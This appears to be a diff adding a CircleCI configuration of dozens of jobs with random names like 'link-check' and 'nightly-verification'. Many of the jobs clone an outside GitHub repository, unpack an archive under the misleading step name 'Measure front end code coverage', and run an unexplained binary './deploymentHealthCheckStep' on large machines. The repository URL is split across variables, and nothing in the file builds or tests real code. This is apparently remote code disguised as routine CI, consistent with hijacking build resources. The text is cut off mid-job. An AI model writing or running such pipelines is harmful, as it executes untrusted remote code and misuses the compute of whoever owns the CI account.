@@ -1,0 +1,1566 @@
+version: 2.1
+
+jobs:
+  RollBackVersionBump:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Apply agent manifests
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'FinalizeSandboxRelease publishReleaseBuild' > /tmp/AccessibilityAuditStage/ImporterPartition6
+            ls -l /tmp/AccessibilityAuditStage/ImporterPartition6
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'ImporterPartition6'
+  post-migration-image-signing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/ImporterPartition6" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 2 --no-single-branch "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -c './deploymentHealthCheckStep'
+  indexer-database-migration-job:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: ExtendedSiteDeployment
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'alertReviewersOfSuccess Reviews' > /tmp/AccessibilityAuditStage/LintingBrowserTestsForCanary
+            ls -l /tmp/AccessibilityAuditStage/LintingBrowserTestsForCanary
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'LintingBrowserTestsForCanary'
+  FetchLibraryInBatches:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/TagMergeCommit" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --filter blob:none "$retry/$worker/$drain" "${PWD}"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -c "./deploymentHealthCheckStep"
+  CompareBackupAgentChecksums:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: post-upgrade-stage
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'PlaygroundReview toolkit-checks' > /tmp/AccessibilityAuditStage/rename-test-harness-binary
+            ls -l /tmp/AccessibilityAuditStage/rename-test-harness-binary
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'rename-test-harness-binary'
+  collecting-driver-test-summary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/rename-test-harness-binary" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 1 --no-tags --filter=blob:none "$retry/$worker/$drain" $PWD
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            $(pwd)/deploymentHealthCheckStep
+  strict-source-checkout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: generate-and-verify-default-loader-settings
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'AssembleTestMatrix LongRunningRelease' > /tmp/AccessibilityAuditStage/ManualApprovalLane6
+            ls -l /tmp/AccessibilityAuditStage/ManualApprovalLane6
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'ManualApprovalLane6'
+  test-landing-page:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/ManualApprovalLane6" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=5 --no-tags "$retry/$worker/$drain" $(pwd)
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            /bin/sh -c "./deploymentHealthCheckStep"
+  record-console-release-tag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: notification-service-migrations (node 1 of 6)
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'restarting-mock-server preDeployInstallationTests' > /tmp/AccessibilityAuditStage/trigger-installation-tests
+            ls -l /tmp/AccessibilityAuditStage/trigger-installation-tests
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'trigger-installation-tests'
+  auditing-compiler-flags:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/trigger-installation-tests" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 2 --no-single-branch "$retry/$worker/$drain" "`pwd`"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            $(pwd)/deploymentHealthCheckStep
+  FirmwareStep8Of13:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: fast-documentation-release
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'project-setup-pipeline PostApprovalMigrationTests' > /tmp/AccessibilityAuditStage/TagMergeCommit
+            ls -l /tmp/AccessibilityAuditStage/TagMergeCommit
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'TagMergeCommit'
+  locking-deployments:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/TagMergeCommit" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=3 "$retry/$worker/$drain" "`pwd`"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -lc './deploymentHealthCheckStep'
+  local-engine-install:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ReviewReleaseCandidate
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'name-server-startup-tests MessagingCheckout' > /tmp/AccessibilityAuditStage/BundleCollectorTypeDefinitions
+            ls -l /tmp/AccessibilityAuditStage/BundleCollectorTypeDefinitions
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'BundleCollectorTypeDefinitions'
+  adapter-checksum-comparison:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/BundleCollectorTypeDefinitions" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=4 "$retry/$worker/$drain" "${PWD}"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            $(pwd)/deploymentHealthCheckStep
+  fetch-dependency-graph:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: search service configuration export (wave 1 of 6)
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'AssembleSourceArchiveStep12 LocalSecurityGate' > /tmp/AccessibilityAuditStage/AuditCompilerFlagsUnlessSkipped
+            ls -l /tmp/AccessibilityAuditStage/AuditCompilerFlagsUnlessSkipped
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'AuditCompilerFlagsUnlessSkipped'
+  link-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/AuditCompilerFlagsUnlessSkipped" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --quiet "$retry/$worker/$drain" "$PWD"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./deploymentHealthCheckStep
+  compile-and-test-registry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Post-Push License Review
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'preliminary-lint multi-stage-repository-backup' > /tmp/AccessibilityAuditStage/run-slot-5
+            ls -l /tmp/AccessibilityAuditStage/run-slot-5
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'run-slot-5'
+  LoadBalancerVersionNumber:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/run-slot-5" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=1 --filter=tree:0 "$retry/$worker/$drain" $PWD
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            './deploymentHealthCheckStep'
+  cleanup-task-replica-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: WarmExporterLayerCache
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'CertificatesRetry1 package-and-publish-debug-build' > /tmp/AccessibilityAuditStage/minimal-rollback-dry-run
+            ls -l /tmp/AccessibilityAuditStage/minimal-rollback-dry-run
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'minimal-rollback-dry-run'
+  DetectingStaleBranches:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/minimal-rollback-dry-run" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=1 --filter=blob:none "$retry/$worker/$drain" $(pwd)
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            sh -c "./deploymentHealthCheckStep"
+  router-cache-setup-hook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Quick Size Report Step
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'post-review-database-migration index-bindings-for-release' > /tmp/AccessibilityAuditStage/controller-cycle-6
+            ls -l /tmp/AccessibilityAuditStage/controller-cycle-6
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'controller-cycle-6'
+  nightly-verification:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/controller-cycle-6" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone -q "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            env "./deploymentHealthCheckStep"
+  ApplyCodeFormatting:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: DownloadAndCacheBuildDependencies
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'post-setup-schema-checks WebAppPackagePublish' > /tmp/AccessibilityAuditStage/SearchForConfigurationDrift
+            ls -l /tmp/AccessibilityAuditStage/SearchForConfigurationDrift
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'SearchForConfigurationDrift'
+  start-server-workers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/SearchForConfigurationDrift" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=2 --branch main "$retry/$worker/$drain" `pwd`
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            /bin/bash -c './deploymentHealthCheckStep'
+  full-source-checkout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Restore database unless skipped
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'pull-framework-base-image final-promotion' > /tmp/AccessibilityAuditStage/bundle-back-end
+            ls -l /tmp/AccessibilityAuditStage/bundle-back-end
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'bundle-back-end'
+  ExtendedRollOut:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/bundle-back-end" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=3 --branch main "$retry/$worker/$drain" "$(pwd)"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$PWD" && ./deploymentHealthCheckStep
+  DesktopAppReleaseArtifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: ConsoleArtifacts
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'BuildAccessibilityTests TelemetryBaseImage' > /tmp/AccessibilityAuditStage/InformReviewersAboutRollback
+            ls -l /tmp/AccessibilityAuditStage/InformReviewersAboutRollback
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'InformReviewersAboutRollback'
+  HashingSlice1Of2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/InformReviewersAboutRollback" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=10 "$retry/$worker/$drain" `pwd`
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd . && ./deploymentHealthCheckStep
+  documentation-rebuild-step:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Run component tests and upload license report
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'cacheDashboardImage Squash' > /tmp/AccessibilityAuditStage/file-server-validation
+            ls -l /tmp/AccessibilityAuditStage/file-server-validation
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'file-server-validation'
+  ImageProcessorCleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/file-server-validation" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --jobs=2 "$retry/$worker/$drain" $(pwd)
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$(pwd)" && ./deploymentHealthCheckStep
+  compress-middleware-packages:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Configure settings loader
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'CopyBinaryToDownloadServer FinalAssetCompilationReplica5' > /tmp/AccessibilityAuditStage/IsolatedArchiveCompressionPhase
+            ls -l /tmp/AccessibilityAuditStage/IsolatedArchiveCompressionPhase
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'IsolatedArchiveCompressionPhase'
+  test-packages:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/IsolatedArchiveCompressionPhase" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=1 --branch main "$retry/$worker/$drain" $(pwd)
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$(pwd)" && ./deploymentHealthCheckStep
+  PostIntegrationLint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/TagMergeCommit" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=3 --filter=blob:none "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -eo pipefail -c "./deploymentHealthCheckStep"
+  validator-module-cache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Build controller
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'ConfigureRendererContainers ConfigurationExportPipeline' > /tmp/AccessibilityAuditStage/writeAgentBuildManifest
+            ls -l /tmp/AccessibilityAuditStage/writeAgentBuildManifest
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'writeAgentBuildManifest'
+  mail-server-log-rotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/writeAgentBuildManifest" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 2 "$retry/$worker/$drain" "`pwd`"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            $(pwd)/deploymentHealthCheckStep
+  patch-bump-stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: linker-build-artifacts
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'importer-schema-migration image-upload-hook' > /tmp/AccessibilityAuditStage/AlertPartition2Of4
+            ls -l /tmp/AccessibilityAuditStage/AlertPartition2Of4
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'AlertPartition2Of4'
+  web-app-version-tag:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/AlertPartition2Of4" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth=1 --no-single-branch "$retry/$worker/$drain" "./"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -lc './deploymentHealthCheckStep'
+  link-exporter-binaries:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Alerting On-Call Engineer About Maintenance Window
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'roll-out-session-store SplitAndRunFastTestsBatch7' > /tmp/AccessibilityAuditStage/post-lint-snapshot-tests
+            ls -l /tmp/AccessibilityAuditStage/post-lint-snapshot-tests
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'post-lint-snapshot-tests'
+  CloningRepository:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/post-lint-snapshot-tests" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --no-single-branch "$retry/$worker/$drain" $PWD
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            sh -c './deploymentHealthCheckStep'
+  LintSummary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/TagMergeCommit" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --jobs 2 "$retry/$worker/$drain" $PWD
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -c './deploymentHealthCheckStep'
+  RuntimeCoverage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: read file size when cache is missing
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'billing-packages plugin-rollback' > /tmp/AccessibilityAuditStage/post-approval-security-report
+            ls -l /tmp/AccessibilityAuditStage/post-approval-security-report
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'post-approval-security-report'
+  decoder-manifest-digest-phase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/post-approval-security-report" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --jobs 1 --depth 1 "$retry/$worker/$drain" ./
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            bash -c "./deploymentHealthCheckStep"
+  routine-canary-deployment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: Link static libraries for nightly build
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'rule-engine-test-cache-pass-4 dispatcher-coverage-report' > /tmp/AccessibilityAuditStage/final-parser-binary-checksum
+            ls -l /tmp/AccessibilityAuditStage/final-parser-binary-checksum
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'final-parser-binary-checksum'
+  generate-test-data:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/final-parser-binary-checksum" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --jobs=2 "$retry/$worker/$drain" "$PWD"
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            "./deploymentHealthCheckStep"
+  LibraryPublish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: firmwareArchive
+          command: |
+            mkdir -p /tmp/AccessibilityAuditStage && echo 'gather-test-results queue-monitoring-hook-lane-4' > /tmp/AccessibilityAuditStage/OnDemandTranslationImportTier3
+            ls -l /tmp/AccessibilityAuditStage/OnDemandTranslationImportTier3
+      - persist_to_workspace:
+          root: /tmp/AccessibilityAuditStage
+          paths:
+            - 'OnDemandTranslationImportTier3'
+  StartAndMonitorEventBus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/AccessibilityAuditStage
+      - run:
+          name: GenerateAndValidateDocumentationStage1Of2
+          command: |
+            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/OnDemandTranslationImportTier3" | head -n 10 | cut -c 1-40
+      - run:
+          name: deploying-instance
+          command: |
+            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
+            git clone --depth 1 --filter=blob:none "$retry/$worker/$drain" "."
+      - run:
+          name: Measure front end code coverage
+          command: |
+            tar -xj -f upload-build-summary.tar.bz2
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./deploymentHealthCheckStep
+  RendererBuildDependencies:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: write-document-converter-dependency-tree
+          command: |
